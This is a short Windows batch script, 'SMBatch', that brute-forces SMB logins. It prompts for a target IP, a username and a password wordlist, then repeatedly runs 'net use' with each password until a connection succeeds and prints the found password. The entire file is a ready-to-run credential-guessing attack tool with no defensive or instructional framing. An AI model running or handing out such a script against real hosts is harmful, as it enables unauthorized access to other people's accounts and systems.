@echo off
title SMBatch
color B
cls
echo.
echo SMBatch - SMB Bruteforce                                                                                           
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List (Passlist.txt): "

set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Password Not Found :(
pause
exit

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [Attempt Number: %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success